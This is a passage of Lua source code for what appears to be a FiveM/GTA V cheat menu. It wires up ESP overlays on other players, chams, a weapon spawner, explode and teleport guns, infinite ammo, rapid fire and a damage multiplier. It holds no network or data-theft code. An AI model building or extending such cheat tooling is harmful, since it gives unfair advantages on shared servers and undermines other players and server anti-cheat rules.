                   sum.s['visuals-lines-r'].value, sum.s['visuals-lines-g'].value, sum.s['visuals-lines-b'].value = sum.f.ColorPicker(sum.s['visuals-lines-r'].value, sum.s['visuals-lines-g'].value, sum.s['visuals-lines-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-lines-vis', 'Visible Check', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-lines-vis-r'].value, sum.s['visuals-lines-vis-g'].value, sum.s['visuals-lines-vis-b'].value, 0.51, y) then 
                   sum.s['visuals-lines-vis-r'].value, sum.s['visuals-lines-vis-g'].value, sum.s['visuals-lines-vis-b'].value = sum.f.ColorPicker(sum.s['visuals-lines-vis-r'].value, sum.s['visuals-lines-vis-g'].value, sum.s['visuals-lines-vis-b'].value)
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Vehicle Options', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-vehicle-esp', 'Vehicle ESP', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-vehicle-r'].value, sum.s['visuals-vehicle-g'].value, sum.s['visuals-vehicle-b'].value, 0.51, y) then 
                   sum.s['visuals-vehicle-r'].value, sum.s['visuals-vehicle-g'].value, sum.s['visuals-vehicle-b'].value = sum.f.ColorPicker(sum.s['visuals-vehicle-r'].value, sum.s['visuals-vehicle-g'].value, sum.s['visuals-vehicle-b'].value)
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Glow Options', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-glow-esp', 'Glow', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-glow-r'].value, sum.s['visuals-glow-g'].value, sum.s['visuals-glow-b'].value, 0.51, y) then 
                   sum.s['visuals-glow-r'].value, sum.s['visuals-glow-g'].value, sum.s['visuals-glow-b'].value = sum.f.ColorPicker(sum.s['visuals-glow-r'].value, sum.s['visuals-glow-g'].value, sum.s['visuals-glow-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('rainbow-glow-esp', 'Rainbow', 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('Dynamic ESP', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-enabledynamic', 'Enable Dynamic ESP', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-dynamicpeds', 'Render On Peds', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-dynamicself', 'Render On Yourself', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-dynamicbox', 'Dynamic Box', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-dynamicbox-fill', 'Dynamic Box Fill', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-dynamichealth', 'Dynamic Healthbar', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-dynamicarmor', 'Dynamic Armorbar', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Glow Effect', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Clear Glowing', 0.51, y) then 
                   sum.f.ClearTimecycleModifier()
               end 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Blue Glowing', 0.51, y) then 
                   sum.f.SetTimecycleModifier('mp_lad_day')
                   sum.f.SetTimecycleModifierStrength(3.3)
               end 
           end
           y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('White Glowing', 0.51, y) then 
                   sum.f.SetTimecycleModifier('mp_lad_day')
                   sum.f.SetTimecycleModifierStrength(1.0)
               end 
           end
           y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Orange Glowing', 0.51, y) then 
                   sum.f.SetTimecycleModifier('mp_lad_judgment')
                   sum.f.SetTimecycleModifierStrength(1.0)
               end 
           end
           y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Red Glowing', 0.51, y) then 
                   sum.f.SetTimecycleModifier('mp_lad_night')
                   sum.f.SetTimecycleModifierStrength(1.0)
               end 
           end
           y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Chams Options', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Chams', {"Black"} , 0.51, y, sum.combo[15], function(currentIndex)
                   sum.combo[15] = currentIndex
               end) then
                   sum.f.chams('Add')
               end 
           end
           y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Remove Chams', 0.51, y) then 
                   sum.f.chams('Remove')
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.separator('Skeletons Options', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-skeletons', 'Skeletons', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-skeletons-r'].value, sum.s['visuals-skeletons-g'].value, sum.s['visuals-skeletons-b'].value, 0.51, y) then 
                   sum.s['visuals-skeletons-r'].value, sum.s['visuals-skeletons-g'].value, sum.s['visuals-skeletons-b'].value = sum.f.ColorPicker(sum.s['visuals-skeletons-r'].value, sum.s['visuals-skeletons-g'].value, sum.s['visuals-skeletons-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-skeletons-vischeck', 'Visible Check', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-skeletons-vis-r'].value, sum.s['visuals-skeletons-vis-g'].value, sum.s['visuals-skeletons-vis-b'].value, 0.51, y) then 
                   sum.s['visuals-skeletons-vis-r'].value, sum.s['visuals-skeletons-vis-g'].value, sum.s['visuals-skeletons-vis-b'].value = sum.f.ColorPicker(sum.s['visuals-skeletons-vis-r'].value, sum.s['visuals-skeletons-vis-g'].value, sum.s['visuals-skeletons-vis-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-skeletons-self', 'Render on yourself', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-skeletons-peds', 'Render on peds', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Bounding Box Options', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-boundingbox', 'Boudning Box', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-bounding-r'].value, sum.s['visuals-bounding-g'].value, sum.s['visuals-bounding-b'].value, 0.51, y) then 
                   sum.s['visuals-bounding-r'].value, sum.s['visuals-bounding-g'].value, sum.s['visuals-bounding-b'].value = sum.f.ColorPicker(sum.s['visuals-bounding-r'].value, sum.s['visuals-bounding-g'].value, sum.s['visuals-bounding-b'].value)
               end
           end y = y + add   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-boundibg-box-outline', 'Box Outline', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-fillbounding-box', 'Fill Box', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['visuals-bounding-alpha'], 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-bounding-box-vischeck', 'Visible Check', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-bounding-vis-r'].value, sum.s['visuals-bounding-vis-g'].value, sum.s['visuals-bounding-vis-b'].value, 0.51, y) then 
                   sum.s['visuals-bounding-vis-r'].value, sum.s['visuals-bounding-vis-g'].value, sum.s['visuals-bounding-vis-b'].value = sum.f.ColorPicker(sum.s['visuals-bounding-vis-r'].value, sum.s['visuals-bounding-vis-g'].value, sum.s['visuals-bounding-vis-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-boundingbox-self', 'Render on yourself', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-boundingbox-peds', 'Render on peds', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Corner Box Options', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-cornerbox', 'Corner Box', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-corner-r'].value, sum.s['visuals-corner-g'].value, sum.s['visuals-corner-b'].value, 0.51, y) then 
                   sum.s['visuals-corner-r'].value, sum.s['visuals-corner-g'].value, sum.s['visuals-corner-b'].value = sum.f.ColorPicker(sum.s['visuals-corner-r'].value, sum.s['visuals-corner-g'].value, sum.s['visuals-corner-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-fillcorner-box', 'Fill', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['visuals-corner-alpha'], 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-corner-box-vischeck', 'Visible Check', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-corner-vis-r'].value, sum.s['visuals-corner-vis-g'].value, sum.s['visuals-corner-vis-b'].value, 0.51, y) then 
                   sum.s['visuals-corner-vis-r'].value, sum.s['visuals-corner-vis-g'].value, sum.s['visuals-corner-vis-b'].value = sum.f.ColorPicker(sum.s['visuals-corner-vis-r'].value, sum.s['visuals-corner-vis-g'].value, sum.s['visuals-corner-vis-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-cornerbox-self', 'Render on yourself', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-cornerbox-peds', 'Render on peds', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Healthbar Options', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-healthbar', 'Healthbar', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-health-r'].value, sum.s['visuals-health-g'].value, sum.s['visuals-health-b'].value, 0.51, y) then 
                   sum.s['visuals-health-r'].value, sum.s['visuals-health-g'].value, sum.s['visuals-health-b'].value = sum.f.ColorPicker(sum.s['visuals-health-r'].value, sum.s['visuals-health-g'].value, sum.s['visuals-health-b'].value)
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-health-bar', 'Color Override', 0.51, y) 
           end y = y + add   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-healthbar-outline', 'Health Outline', 0.51, y) 
           end y = y + add   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-healthbar-text', 'Health Text', 0.51, y) 
           end y = y + add   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-healthbar-self', 'Render on yourself', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-healthbar-peds', 'Render on peds', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Armorbar Options', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-armorbar', 'Armorbar', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-armor-r'].value, sum.s['visuals-armor-g'].value, sum.s['visuals-armor-b'].value, 0.51, y) then 
                   sum.s['visuals-armor-r'].value, sum.s['visuals-armor-g'].value, sum.s['visuals-armor-b'].value = sum.f.ColorPicker(sum.s['visuals-armor-r'].value, sum.s['visuals-armor-g'].value, sum.s['visuals-armor-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-armorbar-text', 'Armor Text', 0.51, y) 
           end y = y + add   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-armorbar-self', 'Render on yourself', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-armorbar-peds', 'Render on peds', 0.51, y) 
           end y = y + add  
       end
   
       if sum.f.tab == 'weapons' then 
           local y = 0.387+0.0155+sum.st['weapons'].static2
           local add = 0.0155
           local max = 0.65+dH/1.06
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - ((#sum.ALLWEAPONS-16) * add)) and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['weapons'].static2 = sum.st['weapons'].static2 - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387+0.0155 and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['weapons'].static2 = sum.st['weapons'].static2 + add
           end
   
           sum.f.separator('Weapons Spawner', 0.51, 0.387) 
       
           for k, v in pairs(sum.ALLWEAPONS) do 
               if y >= 0.4 and y <= max then 
                   if sum.f.button(v, 0.51, y) then 
                       sum.f.GiveWeaponToPed(sum.f.PlayerPedId(), sum.f.GetHashKey(v), 155, false, false)
                       sum.f.sendNotification('Gived: '..v,'Weapons')
                   end
               end y = y + add  
           end
   
           local y = 0.387+sum.st['weapons'].static
   
   
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (17 * add)) and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.12-dW/2, 0.264+dH) then
               sum.st['weapons'].static = sum.st['weapons'].static - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.12-dW/2, 0.264+dH) then
               sum.st['weapons'].static = sum.st['weapons'].static + add
           end
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Cheats ', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-firegun', 'Fire Gun', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-teleportgun', 'Teleport Gun', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-deletegun', 'Delete Gun', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-pickupgun', 'Pick Up Gun', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-explodegun', 'Explode Gun', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-bulletTrace', 'Bullet Trace', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-bulletPreview', 'Bullet Impact Preview', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-infammo', 'Infinite Ammunation', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-noreload', 'No Reload', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-rapidFire', 'Rapid Fire', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-clowngun', 'Clown Gun', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-multiplier', 'Damage Multiplier', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['multiplier-value'], 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Ammo Options', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Fill Ammo', 0.3875, y) then 
                   local p = sum.f.PlayerPedId()
                   local _, gun = sum.f.GetCurrentPedWeapon(p)
                   sum.f.sendNotification('Filled Ammo: '..sum.s['fill-ammo'].value,'Weapons')
                   sum.f.SetPedAmmo(p, gun, sum.s['fill-ammo'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['fill-ammo'], 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Fill Clip', 0.3875, y) then 
                   local p = sum.f.PlayerPedId()
                   local _, gun = sum.f.GetCurrentPedWeapon(p)
                   sum.f.sendNotification('Filled Clip','Weapons')
                   sum.f.SetPedAmmo(p, gun, sum.f.GetWeaponClipSize(gun))  
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Weapon Spawning', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Add All Weapons', 0.3875, y) then 
                   for i = 1, #sum.ALLWEAPONS do
                       local p = sum.f.PlayerPedId()
                   sum.f.GiveWeaponToPed(p, sum.f.GetHashKey(sum.ALLWEAPONS[i]), 256, false, false)
                   end
                   sum.f.sendNotification('Gived All Weapons','Weapons')
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Remove All Weapons', 0.3875, y) then 
                   sum.f.RemoveAllPedWeapons(sum.f.PlayerPedId(), false)
                   sum.f.sendNotification('Removed All Weapons','Weapons')
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Add Weapon', 0.3875, y) then 
                   local weapon = sum.f.kinput('Weapon', 'pistol', 30)
                   sum.f.GiveWeaponToPed(sum.f.PlayerPedId(), sum.f.GetHashKey('weapon_'..weapon), 155, false, false)
                   sum.f.sendNotification('Gived: weapon_'..weapon,'Weapons')
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Remove Weapon', 0.3875, y) then 
                   local weapon = sum.f.kinput('Weapon', 'pistol', 30)
                   sum.f.RemoveWeaponFromPed(sum.f.PlayerPedId(), sum.f.GetHashKey('weapon_'..weapon))
                   sum.f.sendNotification('Removed: weapon_'..weapon,'Weapons')
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('Weapon Modifiers', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-hitmarker', 'Hit Marker', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-hitmarker-3d', 'Hit Marker 3D', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-hitsound', 'Hit Sound', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-hiteffect', 'Hit Effect', 0.3875, y) 
           end y = y + add  
   if y >= 0.385 and y <= max then 
       if sum.f.button('Add Luxury Tint', 0.3875, y) then 
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xD7391086)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xC6654D72)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x487AAE09)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x27872C90)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x278C78AF)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xA2D79DDB)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x4EAD7533)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xD89B9658)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xD6DABABE)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x161E9241)
           sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x7A6A7B7B)
           end
           end y = y + add  
           if y >= 0.385 and y <= max then 
           if sum.f.button('Add Extended Clip', 0.3875, y) then 
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xED265A1C)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xD67B4F2D)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x249A17D5)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xD9D3AC92)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x7B0033B3)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x64F9C62B)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xCE8C0772)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x5ED6C128)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x33BA12E8)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x81786CA9)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x10E6BA2B)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x350966FB)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xBB46E417)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x937ED0B7)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xB9835B2E)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xB92C6979)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x334A5203)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x86BD7F72)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x971CF6FD)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xB1214F9B)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x91109691)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x8EC1C979)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x7C8BD10E)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xB3688B0F)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xEFB00628)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xDE1FA12C)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xD12ACA6F)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x5DD5DBD5)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x59FF9BF8)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x684ACE42)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x82158B47)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xD6C59CD6)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x17DF42E9)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xEAC8C270)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xE6CFD1AA)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x2CD8FF9D)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xCCFD2AC5)
           end
           end y = y + add  
           
           if y >= 0.385 and y <= max then 
           if sum.f.button('Add Flashlight', 0.3875, y) then 
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x359B7AAE)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x7BC4CDDC)
           end
           end y = y + add  
           if y >= 0.385 and y <= max then 
           if sum.f.button('Add Grip', 0.3875, y) then 
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x359B7AAE)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x7BC4CDDC)
           end
           end y = y + add  
           if y >= 0.385 and y <= max then 
           if sum.f.button('Add Suppresor', 0.3875, y) then 
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x65EA7EBB)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x837445AA)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xA73D4664)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xC304849A)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xE608B35E)
           end
           end y = y + add  
           if y >= 0.385 and y <= max then 
           if sum.f.button('Add Scope', 0.3875, y) then 
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x9D2FBF29)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xA0D89C42)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xAA2C45B4)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0xD2443DDC)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x3CC6BA57)
               sum.f.GiveWeaponComponentToPed(sum.f.PlayerPedId(), sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), 0x3C00AFED)
           end
           end y = y + add  
           
   end
       
       if sum.f.tab == 'vehicle' then 
           local y = 0.387+0.0155*2+sum.st['vehicle'].static2
           local add = 0.0155
           local max = 0.65+dH/1.06
           local max2 = 0.65+dH/1.06
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387+0.0155*2 - (20 * add)) and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['vehicle'].static2 = sum.st['vehicle'].static2 - add
